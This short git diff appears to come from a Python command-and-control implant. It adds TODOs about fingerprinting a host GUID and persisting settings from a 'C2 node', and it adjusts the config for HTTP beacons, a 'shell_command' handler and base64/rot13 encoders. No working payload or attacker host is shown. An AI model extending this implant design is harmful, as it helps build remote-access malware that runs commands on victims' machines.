@@ -12,11 +12,14 @@ from random import randint
 # TODO:
 # - Prevent replays
 # - Add active day and active hour calculation to calculate_sleep()
+# - Get a GUID based off of MAC/IP/PC Name
+# - Move global values into an xml/plist type file for persistent changes from C2 node.
 #
 # READ:
 # - http://docs.python-guide.org/en/latest/shipping/freezing/
 # - http://stackoverflow.com/questions/13629321/handling-dynamic-import-with-py2exe
 # - http://www.pythoncentral.io/pyinstaller-package-python-applications-windows-mac-linux/
+
 PROMPT = "[]>"
 
 MIN_SLEEP_INT = 60
@@ -36,9 +39,15 @@ def load_config():
     #
     beacons = ['http_get']
     commands = ['shell_command', 'test_command']
-    decoders = ['base64c','jsonc','rot13']
+    decoders = ['base64c','rot13','jsonc']
     encoders = []
     responders = []
+    
+    if len(encoders) == 0:
+            encoders = reversed(decoders)
+            
+    if len(responders) == 0:
+            responders = beacons
     
     return (beacons,commands,decoders,encoders,responders)
     
